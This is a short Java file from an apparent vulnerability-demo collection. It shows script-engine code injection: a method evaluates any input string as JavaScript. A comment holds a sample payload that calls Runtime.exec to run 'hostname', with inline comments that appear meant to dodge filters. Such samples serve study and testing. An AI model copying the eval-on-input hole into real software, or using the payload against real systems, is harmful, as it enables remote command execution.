package com.ppp.vulns.core.vulns;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;

/**
 * @author Whoopsunix
 *
 * 代码注入
 */
public class Code {
    public static void main(String[] args) throws Exception{
        Object re = scriptEngine("");
    }

    /**
     * scriptEngine 代码注入
     * @param code
     * @return
     * @throws Exception
     */
    // var runtime = java.lang./**/Runtime./**/getRuntime();var process = runtime.exec("hostname");var inputStream = process.getInputStream();var scanner = new java.util.Scanner(inputStream,"GBK").useDelimiter("\\A");var result = scanner.hasNext() ? scanner.next() : "";scanner.close();result;
    public static Object scriptEngine(String code) throws Exception {
        ScriptEngineManager manager = new ScriptEngineManager();
        ScriptEngine engine = manager.getEngineByName("js");
        Object object = engine.eval(code);
        return object;
    }
}
